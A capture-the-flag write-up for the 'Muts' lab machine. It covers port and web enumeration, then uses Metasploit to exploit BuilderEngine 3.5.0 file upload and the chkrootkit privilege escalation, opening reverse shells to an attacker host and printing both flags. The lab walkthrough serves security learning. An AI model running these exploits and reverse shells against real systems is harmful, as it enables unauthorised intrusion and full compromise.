
# Muts - CTF

Distributed by FIAP as a weekend challenge.


## IP Discovery

Static IP Address:
```
10.2.0.11
```

## Port Scanning

```
$ nmap -AT4 -p- 10.2.0.11
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-13 22:08 -03
Nmap scan report for 10.2.0.11
Host is up (0.00058s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE CAPA TOP STLS PIPELINING SASL RESP-CODES
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43045/udp6  status
|   100024  1          47886/tcp6  status
|   100024  1          51370/udp   status
|_  100024  1          53159/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: OK have ID post-login SASL-IR IMAP4rev1 listed more Pre-login capabilities IDLE LITERAL+ LOGINDISABLEDA0001 STARTTLS LOGIN-REFERRALS ENABLE
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imaps?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3s?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
53159/tcp open  status      1 (RPC #100024)
Service Info: Host: MUTS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h20m00s, deviation: 2h53m12s, median: -3h00m01s
|_nbstat: NetBIOS name: MUTS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: muts
|   NetBIOS computer name: MUTS\x00
|   Domain name: 
|   FQDN: muts
|_  System time: 2021-02-13T17:08:47-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-13T22:08:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.51 seconds
```

## Web Analysis

```
$ dirb http://10.2.0.11

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 13 22:11:59 2021
URL_BASE: http://10.2.0.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.2.0.11/ ----
==> DIRECTORY: http://10.2.0.11/blocks/                                                                             
==> DIRECTORY: http://10.2.0.11/files/                                                                              
+ http://10.2.0.11/index.html (CODE:200|SIZE:63)                                                                    
==> DIRECTORY: http://10.2.0.11/modules/                                                                            
+ http://10.2.0.11/robots.txt (CODE:200|SIZE:36)                                                                    
+ http://10.2.0.11/server-status (CODE:403|SIZE:289)                                                                
==> DIRECTORY: http://10.2.0.11/system/                                                                             
==> DIRECTORY: http://10.2.0.11/themes/                                                                             
                                                                                                                    
---- Entering directory: http://10.2.0.11/blocks/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                    
---- Entering directory: http://10.2.0.11/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                    
---- Entering directory: http://10.2.0.11/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/ ----
+ http://10.2.0.11/system/.htaccess (CODE:200|SIZE:122)                                                             
==> DIRECTORY: http://10.2.0.11/system/core/                                                                        
==> DIRECTORY: http://10.2.0.11/system/database/                                                                    
==> DIRECTORY: http://10.2.0.11/system/fonts/                                                                       
==> DIRECTORY: http://10.2.0.11/system/helpers/                                                                     
+ http://10.2.0.11/system/index.html (CODE:200|SIZE:142)                                                            
==> DIRECTORY: http://10.2.0.11/system/language/                                                                    
==> DIRECTORY: http://10.2.0.11/system/libraries/                                                                   
                                                                                                                    
---- Entering directory: http://10.2.0.11/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/core/ ----
==> DIRECTORY: http://10.2.0.11/system/core/compat/                                                                 
+ http://10.2.0.11/system/core/index.html (CODE:200|SIZE:142)                                                       
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/database/ ----
==> DIRECTORY: http://10.2.0.11/system/database/drivers/                                                            
+ http://10.2.0.11/system/database/index.html (CODE:200|SIZE:142)                                                   
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/fonts/ ----
+ http://10.2.0.11/system/fonts/index.html (CODE:200|SIZE:142)                                                      
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/helpers/ ----
+ http://10.2.0.11/system/helpers/index.html (CODE:200|SIZE:142)                                                    
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/language/ ----
==> DIRECTORY: http://10.2.0.11/system/language/english/                                                            
+ http://10.2.0.11/system/language/index.html (CODE:200|SIZE:142)                                                   
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/libraries/ ----
+ http://10.2.0.11/system/libraries/index.html (CODE:200|SIZE:142)                                                  
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/core/compat/ ----
+ http://10.2.0.11/system/core/compat/index.html (CODE:200|SIZE:142)                                                
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/database/drivers/ ----
+ http://10.2.0.11/system/database/drivers/index.html (CODE:200|SIZE:142)                                           
==> DIRECTORY: http://10.2.0.11/system/database/drivers/mssql/                                                      
==> DIRECTORY: http://10.2.0.11/system/database/drivers/mysql/                                                      
==> DIRECTORY: http://10.2.0.11/system/database/drivers/odbc/                                                       
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/language/english/ ----
+ http://10.2.0.11/system/language/english/index.html (CODE:200|SIZE:142)                                           
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/database/drivers/mssql/ ----
+ http://10.2.0.11/system/database/drivers/mssql/index.html (CODE:200|SIZE:142)                                     
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/database/drivers/mysql/ ----
+ http://10.2.0.11/system/database/drivers/mysql/index.html (CODE:200|SIZE:142)                                     
                                                                                                                    
---- Entering directory: http://10.2.0.11/system/database/drivers/odbc/ ----
+ http://10.2.0.11/system/database/drivers/odbc/index.html (CODE:200|SIZE:142)                                      
                                                                                                                    
-----------------
END_TIME: Sat Feb 13 22:13:07 2021
DOWNLOADED: 64568 - FOUND: 17
```

## BuilderEngine Analysis

[ GET ] http://10.2.0.11/themes/default_theme_2015/description.txt
```
Default 2015 Theme for BuilderEngine V3.
```

## Exploitation

BuilderEngine 3.5.0 - Arbitrary File Upload and Execution ( https://www.exploit-db.com/exploits/42025 )
```
msf6 > use exploit/multi/http/builderengine_upload_exec

msf6 exploit(multi/http/builderengine_upload_exec) > set RHOSTS 10.2.0.11
msf6 exploit(multi/http/builderengine_upload_exec) > set LHOST 10.2.0.100

msf6 exploit(multi/http/builderengine_upload_exec) > show options

Module options (exploit/multi/http/builderengine_upload_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.2.0.11        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to BuilderEngine
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.0.100       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BuilderEngine 3.5.0


msf6 exploit(multi/http/builderengine_upload_exec) > exploit

[*] Started reverse TCP handler on 10.2.0.100:4444 
[+] Our payload is at: qdjBLhvDMBUTfig.php. Calling payload...
[*] Calling payload...
[*] Sending stage (39282 bytes) to 10.2.0.11
[*] Meterpreter session 1 opened (10.2.0.100:4444 -> 10.2.0.11:60904) at 2021-02-14 17:42:48 -0300
[+] Deleted qdjBLhvDMBUTfig.php

meterpreter > sysinfo
Computer    : Muts
OS          : Linux Muts 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
Meterpreter : php/linux

meterpreter > shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@Muts:/var/www/html/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Flag #1 - User

```
www-data@Muts:/var/www$ cat user.txt
bfbb7e6e6e88d9ae66848b9aeac6b289
```

## Privilege Escalation

Looking for points of interest, we found `chkrootkit`.
```
www-data@Muts:/etc/chkrootkit$ cat README

                         chkrootkit V. 0.49

          Nelson Murilo <nelson@pangeia.com.br> (main author)
            Klaus Steding-Jessen <jessen@cert.br> (co-author)

          This program locally checks for signs of a rootkit.
         chkrootkit is available at: http://www.chkrootkit.org/


                 No illegal activities are encouraged!
         I'm not responsible for anything you may do with it.

           This tool includes software developed by the
           DFN-CERT, Univ. of Hamburg (chklastlog and chkwtmp),
           and small portions of ifconfig developed by
           Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>.
```

## Exploitation

Backgrounding meterpreter session with target.
```
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(multi/http/builderengine_upload_exec) > sessions

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         meterpreter php/linux  www-data (33) @ Muts  10.2.0.100:4444 -> 10.2.0.11:45785 (10.2.0.11)
```

Exploiting `chkrootkit`
```
msf6 > use exploit/unix/local/chkrootkit

msf6 exploit(unix/local/chkrootkit) > set SESSION 1
msf6 exploit(unix/local/chkrootkit) > set LHOST 10.2.0.100
msf6 exploit(unix/local/chkrootkit) > set LPORT 4545

msf6 exploit(unix/local/chkrootkit) > show options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION     1                     yes       The session to run this module on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.0.100       yes       The listen address (an interface may be specified)
   LPORT  4545             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/local/chkrootkit) > exploit

[*] Started reverse TCP handler on 10.2.0.100:4545 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Command shell session 2 opened (10.2.0.100:4545 -> 10.2.0.11:36304) at 2021-02-14 21:40:04 -0300
[+] Deleted /tmp/update

python3 -c 'import pty;pty.spawn("/bin/bash")'

root@Muts:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag #2 - Root

```
root@Muts:~# cat root.txt
a10828bee17db751de4b936614558305
```
